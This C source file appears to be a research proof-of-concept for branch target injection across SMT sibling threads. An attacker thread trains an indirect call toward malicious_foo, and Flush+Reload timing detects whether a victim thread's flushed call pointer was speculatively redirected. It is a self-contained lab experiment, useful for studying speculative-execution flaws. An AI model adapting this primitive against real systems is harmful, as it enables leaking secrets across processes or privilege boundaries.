#define _GNU_SOURCE
#include <assert.h>
#include <inttypes.h>
#include <pthread.h>
#include <string.h>
#include <x86intrin.h>
#include "config.h"
#include "util.h"

char FR_buffer[PAGE_SIZE] __attribute__((aligned(4096)));
char other_buffer[PAGE_SIZE] __attribute__((aligned(4096)));
int flush;

/* Config struct with every member on a different cache line
 * Padding helps with cache line alignment */
struct config {
  void *flush_address;
  char padding1[CL_SIZE - sizeof(void *)];

  int core;
  char padding0[CL_SIZE - sizeof(int)];

  volatile void (*call)(char *);
  char padding2[CL_SIZE - sizeof(void (*)(char *))];

  char *call_arg;
  char padding3[CL_SIZE - sizeof(char *)];

};

void harmless_foo(char *c) {
  /* Do not access c */
  if(other_buffer[0] != 0)
    printf("Reverse the check\n");
}

void malicious_foo(char *c) {
  /* Access c */
  if(*c != 0)
    printf("Reverse the check\n");
}

void *thread(void *arg) {
  struct config *conf = (struct config *)arg;

  /* Pin attacker and victim to SMT cores */
  pin(conf->core);
  busy_wait();

  for(int i = 0; i < 100; i++) {
    
    /* Flush the victim's pointer that will be used below */
#if FLUSH == 1
    _mm_clflush(conf->flush_address);
#endif

    busy_wait();
    /* This is an indirect jump that may be poisoned. 
     * The pointer is being flushed just above */
    conf->call(conf->call_arg);
  }
}

int main(int argc, char **argv) {
  pthread_t attack, victim;
  struct config __attribute__((aligned(CL_SIZE))) victim_conf = { 
    .flush_address = &victim_conf.call,
    .core = VICTIM_CORE,
    .call = harmless_foo,
    .call_arg = FR_buffer
  };
  struct config __attribute__((aligned(CL_SIZE))) attack_conf = { 
    .flush_address = &victim_conf.call,
    .core = ATTACK_CORE,
    .call = malicious_foo,
    .call_arg = other_buffer
  };

  if((argc > 1) && (strcmp(argv[1], "-f") == 0))
    flush = 1;
  else
    flush = 0;

  /* Sanity checks that the buffers are PAGE_SIZE aligned as expected */
  assert(((uintptr_t)FR_buffer % PAGE_SIZE == 0) && "FR_buffer is not page aligned");
  assert(((uintptr_t)other_buffer % PAGE_SIZE == 0) && "other_buffer is not page aligned");
  assert(((uintptr_t)&victim_conf % CL_SIZE == 0) && "Victim config not cache line aligned");
  assert(((uintptr_t)&attack_conf % CL_SIZE == 0) && "Attack config not cache line aligned");

  // pin(0);
  /* Access buffer so PT translation is cached */
  strncpy(FR_buffer,  "victim ", PAGE_SIZE);

  uint64_t cum_tsc = 0;
  for(unsigned n = 0; n < N_EXPTS; n++) {
    /* Flush phase of Flush+Reload */
    _mm_clflush(FR_buffer);
    
    pthread_create(&attack, NULL, thread, &attack_conf);
    pthread_create(&victim, NULL, thread, &victim_conf);
    pthread_join(attack, NULL);
    pthread_join(victim, NULL);

    /* Reload phase of Flush+Reload */
    uint64_t tsc = _rdtscp((unsigned int *)&junk);
    junk ^= FR_buffer[0];
    tsc = _rdtscp((unsigned int *)&junk) - tsc;
    cum_tsc += tsc;
  }
  
  printf("Timestamp: %"PRIu64" cycles\n", cum_tsc / N_EXPTS);

  return 0;
}